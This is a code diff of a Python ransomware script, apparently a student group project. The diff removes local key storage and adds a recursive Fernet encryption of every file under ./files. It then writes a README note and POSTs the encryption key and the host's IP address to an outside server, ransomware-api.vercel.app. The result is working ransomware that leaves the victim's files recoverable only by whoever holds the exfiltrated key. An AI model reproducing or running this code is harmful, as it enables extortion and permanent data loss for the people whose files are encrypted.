@@ -1,15 +1,17 @@
 from cryptography.fernet import Fernet
 import os
+import glob
+import urllib.request
+import urllib.parse
+import json
+import socket
 
+
+# ************************ ENCRIPTACION ******************************
 
 def generate_key():
     key = Fernet.generate_key()
-    with open('key.key', 'wb') as key_file:
-        key_file.write(key)
-
-
-def load_key():
-    return open('key.key', 'rb').read()
+    return key
 
 
 #items to encrypt
@@ -25,14 +27,32 @@ def encrypt(items, key):
             file.write(encrypted_data)
 
 
-if __name__ == '__main__':
+def encrypt_files(key):
     path_to_encrypt = './files'
-    items = os.listdir(path_to_encrypt)
-    full_path = [path_to_encrypt + '/' + item for item in items]
-    generate_key()
-    key = load_key()
+    full_path = glob.glob(path_to_encrypt+"/**", recursive=True)
+    full_path = [f for f in full_path if os.path.isfile(f)] # Saco las carpetas de la lista
 
     encrypt(full_path, key)
 
     with open(path_to_encrypt + '/' + 'README.txt', 'w') as file:
         file.write('Files encrypted by Group 9\n')
+    
+    send_key(key)
+
+
+        
+def send_key(key):
+    ip = socket.gethostbyname(socket.gethostname())
+    data = {'key': key.decode('utf-8'), 'ip': str(ip)}
+    data_json = json.dumps(data).encode('utf-8')
+
+    req = urllib.request.Request('https://ransomware-api.vercel.app/encryption', data=data_json, method='POST')
+    req.add_header('Content-Type', 'application/json')
+
+    with urllib.request.urlopen(req, timeout=60) as response:
+        response_data = response.read()
+    
+        print(response_data.decode('utf-8'))
+
+
+
